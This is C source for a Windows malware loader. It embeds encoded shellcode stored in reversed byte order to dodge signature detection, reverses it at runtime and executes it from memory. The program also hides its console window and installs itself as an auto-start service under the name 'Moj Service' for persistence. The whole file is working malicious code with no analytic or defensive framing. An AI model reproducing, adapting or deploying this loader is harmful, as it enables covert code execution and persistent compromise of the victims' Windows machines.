#define _WIN32_WINNT 0x0500
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <unistd.h>
#include <limits.h>

/*unsigned char buf[] = 
"\xda\xda\xd9\x74\x24\xf4\xbb\x92\x9e\x4f\xa6\x58\x2b\xc9\xb1"
"\x56\x31\x58\x18\x03\x58\x18\x83\xe8\x6e\x7c\xba\x5a\x66\x03"
"\x45\xa3\x76\x64\xcf\x46\x47\xa4\xab\x03\xf7\x14\xbf\x46\xfb"
"\xdf\xed\x72\x88\x92\x39\x74\x39\x18\x1c\xbb\xba\x31\x5c\xda"
"\x38\x48\xb1\x3c\x01\x83\xc4\x3d\x46\xfe\x25\x6f\x1f\x74\x9b"
"\x80\x14\xc0\x20\x2a\x66\xc4\x20\xcf\x3e\xe7\x01\x5e\x35\xbe"
"\x81\x60\x9a\xca\x8b\x7a\xff\xf7\x42\xf0\xcb\x8c\x54\xd0\x02"
"\x6c\xfa\x1d\xab\x9f\x02\x59\x0b\x40\x71\x93\x68\xfd\x82\x60"
"\x13\xd9\x07\x73\xb3\xaa\xb0\x5f\x42\x7e\x26\x2b\x48\xcb\x2c"
"\x73\x4c\xca\xe1\x0f\x68\x47\x04\xc0\xf9\x13\x23\xc4\xa2\xc0"
"\x4a\x5d\x0e\xa6\x73\xbd\xf1\x17\xd6\xb5\x1f\x43\x6b\x94\x77"
"\xa0\x46\x27\x87\xae\xd1\x54\xb5\x71\x4a\xf3\xf5\xfa\x54\x04"
"\x8c\xed\x66\xda\x36\x7d\x99\xdb\x46\x57\x5e\x8f\x16\xcf\x77"
"\xb0\xfd\x0f\x77\x65\x6b\x1a\xef\x46\xc3\x1a\x99\x2e\x11\x1b"
"\x64\x14\x9c\xfd\x36\x3a\xce\x51\xf7\xea\xae\x01\x9f\xe0\x21"
"\x7d\xbf\x0a\xe8\x16\x2a\xe5\x44\x4e\xc3\x9c\xcd\x04\x72\x60"
"\xd8\x60\xb4\xea\xe8\x95\x7b\x1b\x99\x85\x6c\x7c\x61\x56\x6d"
"\xe9\x61\x3c\x69\xbb\x36\xa8\x73\x9a\x70\x77\x8b\xc9\x03\x70"
"\x73\x8c\x35\x0a\x42\x1a\x79\x64\xab\xca\x79\x74\xfd\x80\x79"
"\x1c\x59\xf1\x2a\x39\xa6\x2c\x5f\x92\x33\xcf\x09\x46\x93\xa7"
"\xb7\xb1\xd3\x67\x48\x94\x67\x6f\xb6\x6a\x40\xc8\xde\x94\xd0"
"\xe8\x1e\xff\xd0\xb8\x76\xf4\xff\x37\xb6\xf5\xd5\x1f\xde\x7c"
"\xb8\xd2\x7f\x80\x91\xb3\x21\x81\x16\x68\xd2\xf8\x57\x8f\x13"
"\xfd\x71\xf4\x14\xfd\x7d\x0a\x29\x2b\x44\x78\x6c\xef\xf3\x73"
"\xdb\x52\x55\x1e\x23\xc0\xa5\x0b";*/

char *getBuffer(){
	unsigned char buf[] = "\x0b\xa5\xc0\x23\x1e\x55\x52\xdb\x73\xf3\xef\x6c\x78\x44\x2b\x29\x0a\x7d\xfd\x14\xf4\x71\xfd\x13\x8f\x57\xf8\xd2\x68\x16\x81\x21\xb3\x91\x80\x7f\xd2\xb8\x7c\xde\x1f\xd5\xf5\xb6\x37\xff\xf4\x76\xb8\xd0\xff\x1e\xe8\xd0\x94\xde\xc8\x40\x6a\xb6\x6f\x67\x94\x48\x67\xd3\xb1\xb7\xa7\x93\x46\x09\xcf\x33\x92\x5f\x2c\xa6\x39\x2a\xf1\x59\x1c\x79\x80\xfd\x74\x79\xca\xab\x64\x79\x1a\x42\x0a\x35\x8c\x73\x70\x03\xc9\x8b\x77\x70\x9a\x73\xa8\x36\xbb\x69\x3c\x61\xe9\x6d\x56\x61\x7c\x6c\x85\x99\x1b\x7b\x95\xe8\xea\xb4\x60\xd8\x60\x72\x04\xcd\x9c\xc3\x4e\x44\xe5\x2a\x16\xe8\x0a\xbf\x7d\x21\xe0\x9f\x01\xae\xea\xf7\x51\xce\x3a\x36\xfd\x9c\x14\x64\x1b\x11\x2e\x99\x1a\xc3\x46\xef\x1a\x6b\x65\x77\x0f\xfd\xb0\x77\xcf\x16\x8f\x5e\x57\x46\xdb\x99\x7d\x36\xda\x66\xed\x8c\x04\x54\xfa\xf5\xf3\x4a\x71\xb5\x54\xd1\xae\x87\x27\x46\xa0\x77\x94\x6b\x43\x1f\xb5\xd6\x17\xf1\xbd\x73\xa6\x0e\x5d\x4a\xc0\xa2\xc4\x23\x13\xf9\xc0\x04\x47\x68\x0f\xe1\xca\x4c\x73\x2c\xcb\x48\x2b\x26\x7e\x42\x5f\xb0\xaa\xb3\x73\x07\xd9\x13\x60\x82\xfd\x68\x93\x71\x40\x0b\x59\x02\x9f\xab\x1d\xfa\x6c\x02\xd0\x54\x8c\xcb\xf0\x42\xf7\xff\x7a\x8b\xca\x9a\x60\x81\xbe\x35\x5e\x01\xe7\x3e\xcf\x20\xc4\x66\x2a\x20\xc0\x14\x80\x9b\x74\x1f\x6f\x25\xfe\x46\x3d\xc4\x83\x01\x3c\xb1\x48\x38\xda\x5c\x31\xba\xbb\x1c\x18\x39\x74\x39\x92\x88\x72\xed\xdf\xfb\x46\xbf\x14\xf7\x03\xab\xa4\x47\x46\xcf\x64\x76\xa3\x45\x03\x66\x5a\xba\x7c\x6e\xe8\x83\x18\x58\x03\x18\x58\x31\x56\xb1\xc9\x2b\x58\xa6\x4f\x9e\x92\xbb\xf4\x24\x74\xd9\xda\xda";
	unsigned char *reversedBuf = malloc(sizeof(buf));
	
	int j=0;
	for(int i=sizeof(buf)-2; i>=0; i--){
		reversedBuf[j] = buf[i];
		j++;
	}
	
	return reversedBuf;
}

void hideConsole(){
	HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );
}


int main(int argc, char * argv[])
{
	hideConsole();
	
	char cwd[PATH_MAX];
	if(strstr(argv[0], "main_setup.exe") >0){

		if (strstr(getcwd(cwd, sizeof(cwd)), "system") != NULL) {
			int (*ret)() = (int(*)())getBuffer();
			ret();
			
		}else if(strstr(getcwd(cwd, sizeof(cwd)), "System") != NULL){
			int (*ret)() = (int(*)())getBuffer();
			ret();
			
		}else{
			system("mkdir \"C:\\Program Files\\AAA\"");
			system("copy main_setup.exe \"C:\\Program Files\\AAA\\main_setup.exe\"");
	
			system("sc create MojService binPath= \"C:\\Program Files\\AAA\\main_setup.exe\" DisplayName= \"Moj Service\" start= auto");
			system("sc start MojService");	
		}
		//getchar();
	}
	return (0);
}

//mt\x86\mt.exe -manifest main.exe.manifest -outputresource:main.exe;1
//sc create MojService binPath= "C:\Users\DCH\Desktop\main.exe" DisplayName= "Moj Service" start= auto















